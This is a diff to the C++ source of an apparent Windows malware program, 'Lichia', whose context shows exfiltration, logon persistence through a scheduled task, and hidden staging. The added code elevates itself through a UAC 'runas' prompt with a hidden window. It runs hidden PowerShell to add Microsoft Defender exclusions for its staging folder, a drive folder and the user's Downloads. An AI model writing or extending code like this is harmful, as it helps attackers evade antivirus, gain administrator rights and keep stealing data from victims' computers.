@@ -464,6 +464,75 @@ static void Exfil(const std::wstring& rootW) {
 }
 
 
+static bool IsAdmin() {
+    BOOL ok = FALSE;
+    PSID group = nullptr;
+    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&nt, 2,
+            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+            0, 0, 0, 0, 0, 0, &group)) {
+        CheckTokenMembership(nullptr, group, &ok);
+        FreeSid(group);
+    }
+    return ok != FALSE;
+}
+
+
+static std::wstring RawArgs() {
+    std::wstring cl = GetCommandLineW();
+    bool q = !cl.empty() && cl[0] == L'"';
+    size_t i = q ? cl.find(L'"', 1) + 1 : cl.find(L' ');
+    if (i == std::wstring::npos) return L"";
+    while (i < cl.size() && cl[i] == L' ') ++i;
+    return cl.substr(i);
+}
+
+
+static bool ElevateSelf() {
+    wchar_t buf[MAX_PATH]{};
+    GetModuleFileNameW(nullptr, buf, MAX_PATH);
+    std::wstring args = RawArgs();
+    SHELLEXECUTEINFOW sei{};
+    sei.cbSize = sizeof sei;
+    sei.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = L"runas";
+    sei.lpFile = buf;
+    sei.lpParameters = args.c_str();
+    sei.nShow = SW_HIDE;
+    return ShellExecuteExW(&sei) != FALSE;
+}
+
+
+static void RunShell(const std::wstring& script) {
+    std::wstring cmd =
+        L"powershell.exe -NoProfile -WindowStyle Hidden -Command " + script;
+    STARTUPINFOW si{}; si.cb = sizeof si;
+    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi{};
+    std::vector<wchar_t> mut(cmd.begin(), cmd.end());
+    mut.push_back(L'\0');
+    if (!CreateProcessW(nullptr, mut.data(), nullptr, nullptr, FALSE,
+                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
+        return;
+    WaitForSingleObject(pi.hProcess, 20000);
+    CloseHandle(pi.hProcess);
+    if (pi.hThread) CloseHandle(pi.hThread);
+}
+
+
+static void Shield(const std::wstring& driveRoot) {
+    if (!IsAdmin()) return;
+    wchar_t up[MAX_PATH]{};
+    GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
+    std::wstring s =
+        L"Add-MpPreference -ExclusionPath '" + StageDir().wstring() + L"';" +
+        L"Add-MpPreference -ExclusionPath '" + driveRoot + L"Lichia';" +
+        L"Add-MpPreference -ExclusionPath '" +
+        std::wstring(up) + L"\\Downloads'";
+    RunShell(s);
+}
+
+
 static void Persist() {
     RunHidden(L"C:\\Windows\\System32\\schtasks.exe",
               L"/Create /F /SC ONLOGON /TN Lichia /TR \"\\\"" +
@@ -492,6 +561,8 @@ static void Install() {
     fs::path cfg = fs::path(origin) / L"Lichia" / L"lichen.config";
     if (!fs::exists(cfg)) cfg = fs::path(origin) / L"lichen.config";
     if (!fs::exists(cfg)) return;
+
+    Shield(self.substr(0, 3));
 
     std::error_code ec;
     fs::create_directories(StageDir(), ec);
@@ -549,6 +620,7 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
     if (argc <= 1) install = fs::exists(StageExe());
 
     if (install) {
+        if (!IsAdmin() && ElevateSelf()) return;
         Install();
     } else if (watch) {
         Hide(StageDir());
